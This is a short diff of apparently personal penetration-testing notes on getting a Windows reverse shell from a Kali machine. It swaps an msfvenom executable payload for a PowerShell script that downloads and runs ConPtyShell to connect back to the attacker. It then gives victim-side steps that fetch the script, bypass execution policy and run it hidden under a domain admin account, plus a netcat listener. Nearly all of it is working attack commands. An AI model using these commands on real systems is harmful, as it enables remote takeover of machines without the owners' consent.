@@ -1,10 +1,14 @@
-**Create stageless reverse shell payload for windows on kali
-msfvenom -p windows/shell_reverse_tcp LHOST=<kali ip> LPORT=<port> -f exe > reverse.exe
 **Open a listener on kali for the reverse shell
-nc -lvp <port>
+stty raw -echo; (stty size; cat) | nc -lvnp <port>
+**Create a ps1 reverse shell to be executed on the victim
+echo "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <kali ip> <port>" > shell.ps1
 **Web host the payload from kali
 python3 -m http.server
 **From victim box download file, run as administrator while logged into a domain admin account
+powershell
+Invoke-WebRequest -Uri http://<kali ip>:8000/shell.ps1 -UseBasicParsing -Outfile shell.ps1
+Set-ExecutionPolicy Bypass
+powershell.exe -WindowStyle hidden shell.ps1
 **Go back to kali terminal with listener running, and you should have a shell
 **Commands to run on victim via reverse shell
 powershell
